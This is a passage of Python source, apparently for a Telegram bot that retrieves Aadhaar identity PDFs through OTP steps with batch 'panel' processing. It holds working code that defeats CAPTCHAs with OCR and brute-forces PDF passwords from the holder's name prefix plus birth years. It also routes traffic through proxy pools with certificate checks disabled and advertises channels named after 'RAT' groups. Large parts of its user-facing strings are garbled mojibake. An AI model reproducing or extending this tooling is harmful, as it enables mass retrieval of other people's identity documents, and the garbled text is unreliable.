        from PIL import Image as _PILImg
        from io import BytesIO as _BytesIO2
        img = _PILImg.open(_BytesIO2(img_bytes)).convert("L")
        cfg = r"--oem 3 --psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return pytesseract.image_to_string(img, config=cfg).strip()
    except Exception:
        return ""

def _ocr_classify_beta(img_bytes: bytes) -> str:
    if _ocr_beta is not None:
        try:
            return _ocr_beta.classification(img_bytes)
        except Exception:
            pass
    return _ocr_classify(img_bytes)


def _clean_captcha_text(text: str) -> str:
    if not text:
        return ""
    # Filter out Chinese / non-ASCII Unicode characters produced by ddddocr
    return "".join(c for c in text if c.isascii() and c.isalnum())


def _pil_to_png(pil_img) -> bytes:
    buf = BytesIO()
    pil_img.save(buf, format="PNG")
    return buf.getvalue()


def _pil_clahe(pil_img) -> "Image.Image":
    from PIL import ImageOps
    gray = pil_img.convert("L")
    return ImageOps.equalize(gray)


def solve_captcha_auto(img_bytes: bytes):
    try:
        # Tier 1: Ultra-Fast Raw Path (~20ms)
        raw = _clean_captcha_text(_ocr_classify(img_bytes))
        if len(raw) == 6:
            return raw

        raw_b = _clean_captcha_text(_ocr_classify_beta(img_bytes)) if _ocr_beta else ""
        if len(raw_b) == 6:
            return raw_b

        # Tier 2: Edge Noise Recovery (7 chars -> 6 chars)
        if len(raw) == 7:
            if len(raw_b) == 7:
                if raw[1:] == raw_b[1:]:
                    return raw[1:]
                if raw[:6] == raw_b[:6]:
                    return raw[:6]
            return raw[:6]
        elif len(raw_b) == 7:
            return raw_b[:6]

        # Tier 3: Single Targeted Border Crop (PIL-based, no cv2 needed)
        try:
            pil_img = Image.open(BytesIO(img_bytes)).convert("RGB")
            w, h = pil_img.size
            cropped = pil_img.crop((6, 2, max(7, w - 2), max(4, h - 2)))
            c_bytes = _pil_to_png(cropped)
            c_crop = _clean_captcha_text(_ocr_classify(c_bytes))
            if len(c_crop) == 6:
                return c_crop
            if _ocr_beta:
                c_crop_b = _clean_captcha_text(_ocr_classify_beta(c_bytes))
                if len(c_crop_b) == 6:
                    return c_crop_b

            # Tier 4: Contrast Enhancement (PIL equalize instead of CLAHE)
            clahe_bytes = _pil_to_png(_pil_clahe(cropped))
            c_clahe = _clean_captcha_text(_ocr_classify(clahe_bytes))
            if len(c_clahe) == 6:
                return c_clahe
        except Exception:
            pass

        # Tier 5: Best Effort Fallback
        if raw and len(raw) == 7:
            return raw[1:7]
        if raw and len(raw) >= 6:
            return raw[:6]
        if raw_b and len(raw_b) >= 6:
            return raw_b[:6]
        return None
    except Exception as e:
        logger.warning(f"ocr err: {e}")
        return None


# ==========================================
# PDF HELPERS
# ==========================================
def find_pdf(obj):
    if isinstance(obj, str):
        s = obj.strip()
        if s.startswith("JVBERi") or s.startswith("data:application/pdf"):
            return s
        if len(s) > 1000:
            try:
                if base64.b64decode(s[:20] + "==").startswith(b"%PDF"):
                    return s
            except Exception:
                pass
        return None
    if isinstance(obj, dict):
        for k in ("pdfBase64", "aadhaarPdf", "aadhaarPdfBase64", "pdfData",
                  "pdf", "file", "base64", "document", "data"):
            if k in obj:
                r = find_pdf(obj[k])
                if r:
                    return r
        for v in obj.values():
            r = find_pdf(v)
            if r:
                return r
    if isinstance(obj, list):
        for i in obj:
            r = find_pdf(i)
            if r:
                return r
    return None


def extract_pdf(raw: bytes):
    if not raw:
        return None
    if raw[:4] == b"%PDF":
        return raw
    if raw[:2] == b"PK":
        try:
            with zipfile.ZipFile(BytesIO(raw)) as z:
                for name in z.namelist():
                    if name.lower().endswith(".pdf"):
                        return z.read(name)
        except Exception as e:
            logger.warning(f"zip fail: {e}")

    # Extract JSON cleanly even if HTTP headers or wrappers are present
    idx1 = raw.find(b'{')
    idx2 = raw.rfind(b'}')
    if idx1 != -1 and idx2 != -1:
        raw_json = raw[idx1:idx2+1]
    else:
        raw_json = raw

    try:
        parsed = json.loads(raw_json.decode("utf-8", errors="replace"))
        b64 = find_pdf(parsed)
        if b64:
            if b64.startswith("data:"):
                b64 = b64.split(",", 1)[1]
            return base64.b64decode(b64)
        return parsed
    except Exception as e:
        logger.warning(f"json parse err: {e}")
    return None


def unlock_pdf_bruteforce(pdf_bytes: bytes, name: str, dob: str = None):
    prefix = (name or "").replace(" ", "")[:4].upper()
    if not prefix or len(prefix) < 2:
        return None, None

    years_to_try = []
    if dob:
        m = re.search(r'\b(19\d\d|20\d\d)\b', str(dob))
        if m:
            years_to_try.append(int(m.group(1)))

    priority_years = list(range(2005, 1985, -1)) + list(range(1985, 1965, -1)) + list(range(2006, 2027)) + list(range(1965, 1899, -1))
    for y in priority_years:
        if y not in years_to_try:
            years_to_try.append(y)

    # 1. Try pikepdf (C++ fast, ~0.03s)
    try:
        import pikepdf
        try:
            with pikepdf.open(BytesIO(pdf_bytes)) as p:
                buf = BytesIO()
                p.save(buf)
                return buf.getvalue(), None
        except pikepdf.PasswordError:
            pass

        for year in years_to_try:
            pwd = f"{prefix}{year}"
            try:
                with pikepdf.open(BytesIO(pdf_bytes), password=pwd) as p:
                    buf = BytesIO()
                    p.save(buf)
                    logger.info(f"[pdf] unlocked with pikepdf: {pwd}")
                    return buf.getvalue(), pwd
            except pikepdf.PasswordError:
                continue
        return None, None
    except Exception as e:
        logger.warning(f"pikepdf err: {e}")

    # 2. Fallback to pypdf
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(pdf_bytes))
        if not reader.is_encrypted:
            return pdf_bytes, None
        for year in years_to_try:
            pwd = f"{prefix}{year}"
            try:
                if reader.decrypt(pwd):
                    writer = pypdf.PdfWriter()
                    for page in reader.pages:
                        writer.add_page(page)
                    buf = BytesIO()
                    writer.write(buf)
                    logger.info(f"[pdf] unlocked with pypdf: {pwd}")
                    return buf.getvalue(), pwd
            except Exception:
                continue
    except Exception as e:
        logger.warning(f"pypdf err: {e}")

    return None, None


# ==========================================
# EMOJI MAP
# ==========================================
EMOJI_MAP = {
    "Ã°ÂÂÂ¢": "6305206294848475991", "Ã°ÂÂÂ": "5258337316715373336",
    "Ã¢ÂÂ": "5436113877181941026", "Ã¢ÂÂ¹Ã¯Â¸Â": "5420323339723881652",
    "Ã°ÂÂÂ§": "5341715473882955310", "Ã°ÂÂÂ": "6204139486671019705",
    "Ã°ÂÂÂ": "5296369303661067030", "Ã¢ÂÂ": "6275829594717165532",
    "Ã°ÂÂÂ": "5258477770735885832", "Ã°ÂÂÂ¯": "6275956313432266859",
    "Ã¢ÂÂ¡": "5456140674028019486", "Ã°ÂÂÂ": "5258328383183396223",
    "1Ã¯Â¸ÂÃ¢ÂÂ£": "6141182593325862850", "2Ã¯Â¸ÂÃ¢ÂÂ£": "6140858267460440006",
    "3Ã¯Â¸ÂÃ¢ÂÂ£": "6140761832559742520", "4Ã¯Â¸ÂÃ¢ÂÂ£": "6143358763060433247",
    "5Ã¯Â¸ÂÃ¢ÂÂ£": "6140671341893784411", "Ã¢ÂÂ Ã¯Â¸Â": "5274099962655816924",
    "Ã°ÂÂÂ": "5030872266716480568", "Ã¢ÂÂÃ¯Â¸Â": "5314613581705132533",
    "Ã¢ÂÂ": "6305324410744084248", "Ã°ÂÂÂ": "6204093414556834971",
    "Ã°ÂÂÂ": "5427168083074628963", "Ã°ÂÂÂ": "5362061893605279054",
    "Ã°ÂÂÂ": "6235449188373502693", "Ã°ÂÂÂ": "5203910550542631009",
    "Ã°ÂÂÂ": "5397782960512444700", "Ã°ÂÂÂ¤": "6305229569276254220",
    "Ã°ÂÂÂ": "6005835877337535334", "Ã¢Â­Â": "4970181191958266458",
    "Ã°ÂÂÂ«": "5240241223632954241", "Ã°ÂÂÂ Ã¯Â¸Â": "6235572922086331108",
    "Ã°ÂÂªÂª": "5890864241388293875", "Ã°ÂÂÂ±": "6201882038975341348",
    "Ã¢ÂÂ³": "5386367538735104399", "Ã°ÂÂÂ": "6276030448862763508",
    "Ã°ÂÂÂ": "6305240074766259789", "Ã°ÂÂ«Â¡": "6305043124745934564",
    "Ã°ÂÂÂ": "5190447043545438788", "Ã°ÂÂÂ": "5296369303661067030",
    "Ã°ÂÂÂ¨": "5274099962655816924", "Ã¢ÂÂ": "4956507094124594921",
    "Ã°ÂÂÂ": "4958534924278694938", "Ã°ÂÂÂ¥": "5427168083074628963",
    "Ã°ÂÂÂ": "5240241223632954241", "Ã°ÂÂÂ": "5296369303661067030",
    "Ã°ÂÂÂ": "6339130648086714868",
}


def _repair_mojibake(value: str) -> str:
    """Repair the duplicated UTF-8 decoding present in the legacy source strings."""
    result = str(value)
    for _ in range(2):
        try:
            repaired = result.encode("latin-1").decode("utf-8")
        except (UnicodeEncodeError, UnicodeDecodeError):
            break
        if repaired == result:
            break
        result = repaired
    return result


def emo(e):
    # Do not emit tg-emoji HTML: invalid/unavailable custom emoji IDs caused
    # Telegram Entity_text_invalid and prevented otherwise valid replies.
    return html.escape(_repair_mojibake(e))


def is_not_linked_error(err_str: str) -> bool:
    """DEFINITIVE not-linked Ã¢ÂÂ bail immediately without retry.
    Only messages that UIDAI sends exclusively for genuinely unlinked numbers."""
    if not err_str:
        return False
    s = str(err_str).lower()
    keywords = [
        "not linked", "mobile not linked", "mobile number not linked",
        "mobile number is not linked", "number is not linked",
        "not registered with aadhaar", "mobile number is not registered",
        "enter registered mobile", "unregistered mobile",
    ]
    return any(k in s for k in keywords)


def is_soft_not_found_error(err_str: str) -> bool:
    if not err_str:
        return False
    s = str(err_str).lower()
    keywords = [
        "no records found", "no record found",
        "records not found", "record not found",
        "couldn't retrieve your aadhaar",
        "could not retrieve your aadhaar",
        "check the data and try again",
        "aadhaar not found", "uid not found",
        "does not exist",
    ]
    return any(k in s for k in keywords)


def get_not_linked_msg():
    return (
        f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
        "<blockquote>"
        "<b>Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ± ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â.</b>"
        "</blockquote>\n\n"
        "<b>Ã¢ÂÂ¢ ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´ÃÂ¢ /start</b>"
    )


# ==========================================
# CHANNELS
# ==========================================
CHANNELS = [
    {"name": "ROR INDIA RAT", "url": "https://t.me/RORINDIANRAT", "id": "@RORINDIANRAT"},
    {"name": "TEAM X ARMY", "url": "https://t.me/teamxarmy87", "id": "@teamxarmy87"},
    {"name": "ROR INDIA CHAT", "url": "https://t.me/RORINDIACHAT", "id": "@RORINDIACHAT"},
]


# ==========================================
# PAID PROXY SESSION POOL
# ==========================================
_PROXY_SESSIONS = {}

def get_proxy_session(proxy_url: str = None) -> AsyncSession:
    global _PROXY_SESSIONS
    # Use paid proxy if no specific proxy_url given
    effective_proxy = proxy_url or (PROXY_URL if USER_PROXIES else None)
    
    if effective_proxy not in _PROXY_SESSIONS:
        curl_opts = {
            CurlOpt.CONNECTTIMEOUT: 6,
            CurlOpt.BUFFERSIZE: 524288,
            CurlOpt.TCP_NODELAY: 1,
        }
        session_kwargs = {
            "max_clients": 128,
            "verify": False,
            "curl_options": curl_opts,
        }
        if effective_proxy:
            session_kwargs["proxies"] = {
                "http": effective_proxy,
                "https": effective_proxy,
            }
        _PROXY_SESSIONS[effective_proxy] = AsyncSession(**session_kwargs)
    
    return _PROXY_SESSIONS[effective_proxy]

async def evict_proxy_session(proxy_url: str = None):
    global _PROXY_SESSIONS
    effective_proxy = proxy_url or (PROXY_URL if USER_PROXIES else None)
    if effective_proxy in _PROXY_SESSIONS:
        try:
            await _PROXY_SESSIONS[effective_proxy].close()
        except Exception:
            pass
        del _PROXY_SESSIONS[effective_proxy]

async def safe_edit_text(msg, text, **kwargs):
    if not msg:
        return None
    try:
        return await msg.edit_text(text, **kwargs)
    except Exception:
        return None


def safe_delete_bg(msg):
    if not msg:
        return
    async def _del():
        try:
            await msg.delete()
        except Exception:
            pass
    try:
        asyncio.create_task(_del())
    except Exception:
        pass


async def send_rich_step1_message(bot, chat_id, txn_id, mobile, reply_to_message_id=None):
    payload = {
        "chat_id": chat_id,
        "rich_message": {
            "blocks": [
                {
                    "type": "paragraph",
                    "text": [
                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
                        {"type": "bold", "text": " Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1 ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1 ) :"}
                    ]
                },
                {
                    "type": "table",
                    "is_bordered": True,
                    "is_striped": True,
                    "cells": [
                        [
                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ"}, "is_header": True, "align": "left"},
                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂs"}, "is_header": True, "align": "left"}
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5203910550542631009"), "alternative_text": "Ã°ÂÂÂ"},
                                    {"type": "bold", "text": " Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃ¡Â´Â"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": str(txn_id)},
                                "align": "left"
                            }
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ±", "6201882038975341348"), "alternative_text": "Ã°ÂÂÂ±"},
                                    {"type": "bold", "text": " Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": str(mobile)},
                                "align": "left"
                            }
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5397782960512444700"), "alternative_text": "Ã°ÂÂÂ"},
                                    {"type": "bold", "text": " sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": "OTP 1 (EID) sent"},
                                "align": "left"
                            }
                        ]
                    ]
                },
                {
                    "type": "paragraph",
                    "text": [
                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ³", "5386367538735104399"), "alternative_text": "Ã¢ÂÂ³"},
                        {"type": "bold", "text": " Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...\n"},
                        {"type": "bold", "text": "Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.\n\n"},
                        {"type": "code", "text": "/cancel"},
                        {"type": "bold", "text": " - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"}
                    ]
                }
            ]
        }
    }
    if reply_to_message_id:
        payload["reply_parameters"] = {"message_id": reply_to_message_id, "allow_sending_without_reply": True}

    try:
        return await bot.do_api_request("sendRichMessage", api_kwargs=payload)
    except Exception as e:
        logger.warning(f"[RICH MSG STEP 1 ERR] {e}, falling back to send_message")
        fallback_text = (
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1 ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1 ) :</b>\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃ¡Â´Â:\n<code>{txn_id}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: {mobile}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: OTP 1 (EID) sent</b>\n"
            "</blockquote>\n"
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n"
            "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.</b>\n"
            "<blockquote>"
            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>"
            "</blockquote>"
        )
        return await bot.send_message(
            chat_id=chat_id,
            text=fallback_text,
            parse_mode="HTML",
            reply_to_message_id=reply_to_message_id
        )


async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=None):
    payload = {
        "chat_id": chat_id,
        "rich_message": {
            "blocks": [
                {
                    "type": "paragraph",
                    "text": [
                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
                        {"type": "bold", "text": " Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂ¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2 )"}
                    ]
                },
                {
                    "type": "table",
                    "is_bordered": True,
                    "is_striped": True,
                    "cells": [
                        [
                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ"}, "is_header": True, "align": "left"},
                            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂs"}, "is_header": True, "align": "left"}
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ¤", "6305229569276254220"), "alternative_text": "Ã°ÂÂÂ¤"},
                                    {"type": "bold", "text": " ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": str(name or "N/A")},
                                "align": "left"
                            }
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "6005835877337535334"), "alternative_text": "Ã°ÂÂÂ"},
                                    {"type": "bold", "text": " Ã¡Â´ÂÃÂªÃ¡Â´Â"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": str(eid)},
                                "align": "left"
                            }
                        ],
                        [
                            {
                                "text": [
                                    {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "5397782960512444700"), "alternative_text": "Ã°ÂÂÂ"},
                                    {"type": "bold", "text": " sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}
                                ],
                                "align": "left"
                            },
                            {
                                "text": {"type": "bold", "text": "Phase 1 verified. Download OTP sent."},
                                "align": "left"
                            }
                        ]
                    ]
                },
                {
                    "type": "paragraph",
                    "text": [
                        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ³", "5386367538735104399"), "alternative_text": "Ã¢ÂÂ³"},
                        {"type": "bold", "text": " Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...\n"},
                        {"type": "bold", "text": "Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.\n\n"},
                        {"type": "code", "text": "/cancel"},
                        {"type": "bold", "text": " - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"}
                    ]
                }
            ]
        }
    }
    if reply_to_message_id:
        payload["reply_parameters"] = {"message_id": reply_to_message_id, "allow_sending_without_reply": True}

    try:
        return await bot.do_api_request("sendRichMessage", api_kwargs=payload)
    except Exception as e:
        logger.warning(f"[RICH MSG STEP 2 ERR] {e}, falling back to send_message")
        fallback_text = (
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂ¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â ( sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2 )</b>\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(name or 'N/A')}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: {eid}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: Phase 1 verified. Download OTP sent.</b>\n"
            "</blockquote>\n"
            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n"
            "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
            "<blockquote>"
            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>"
            "</blockquote>"
        )
        return await bot.send_message(
            chat_id=chat_id,
            text=fallback_text,
            parse_mode="HTML",
            reply_to_message_id=reply_to_message_id
        )


def build_batch_rich_blocks(panel_name: str, dev_statuses: dict, done_c: int, total_c: int, success_c: int, fail_c: int):
    header_text = [
        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ¡", "5456140674028019486"), "alternative_text": "Ã¢ÂÂ¡"},
        {"type": "bold", "text": " ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n\n"},
        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ¥", "5427168083074628963"), "alternative_text": "Ã°ÂÂÂ¥"},
        {"type": "bold", "text": " Panel: "},
        {"type": "code", "text": str(panel_name)},
        {"type": "bold", "text": "\n"},
        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "6204093414556834971"), "alternative_text": "Ã°ÂÂÂ"},
        {"type": "bold", "text": f" Progress: {done_c}/{total_c} ("},
        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
        {"type": "bold", "text": f" {success_c} | "},
        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6305324410744084248"), "alternative_text": "Ã¢ÂÂ"},
        {"type": "bold", "text": f" {fail_c})\n"}
    ]

    cells = [
        [
            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â / Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â"}, "is_header": True, "align": "left"},
